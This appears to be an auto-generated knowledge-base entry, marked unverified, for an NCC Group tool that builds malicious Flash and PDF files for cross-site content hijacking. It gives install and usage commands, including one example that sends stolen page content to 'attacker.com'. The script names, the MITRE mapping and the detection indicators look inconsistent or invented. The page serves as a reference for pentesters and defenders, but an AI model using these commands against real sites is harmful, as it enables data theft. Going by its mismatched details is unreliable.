---
id: tool-uuid-002
name: CrossSiteContentHijacking
type: tool
verified: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:12.803Z'
platforms:
  - Linux
  - Windows
tags:
  - exploitation
  - flash
url: 'https://github.com/nccgroup/CrossSiteContentHijacking'
validated: true
submitted: true
---

# CrossSiteContentHijacking

**Status**: Unverified

## Overview

A GitHub repository by NCC Group providing tools and frameworks to demonstrate and exploit cross-site content hijacking using Flash (SWF) or PDF files, relevant for vulnerabilities like those in CMS Airship.

## Description

Includes scripts to generate malicious SWF files that bypass same-origin policy for content theft, useful in pentesting web apps lacking proper headers.

## Features

- Feature 1: SWF generation for cross-site requests
- Feature 2: PDF exploitation examples
- Feature 3: PoC code for various browsers

## Installation

### Requirements

- Git, Python 2/3
- Flash compiler (for SWF)

### Install Commands

```bash
git clone https://github.com/nccgroup/CrossSiteContentHijacking.git
cd CrossSiteContentHijacking
pip install -r requirements.txt
```

## Basic Usage

```bash
python generate_swf.py --target https://victim.com/data
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help |
| --target | Victim URL to hijack |

## Examples

### Example 1: Basic Usage

```bash
python swf_tool.py output.swf https://target.com
```

### Example 2: Advanced Usage

Custom payload: ```bash
python swf_tool.py --exfil attacker.com output.swf https://target.com/sensitive
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Windows Command Shell]]

### Tactics

- [[Collection]]

## Detection

Indicators and methods for detecting this tool's usage:

- SWF files with anomalous cross-origin loads
- Git clone traffic to NCC Group repo

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[SWFTools]]

## References

- GitHub: https://github.com/nccgroup/CrossSiteContentHijacking
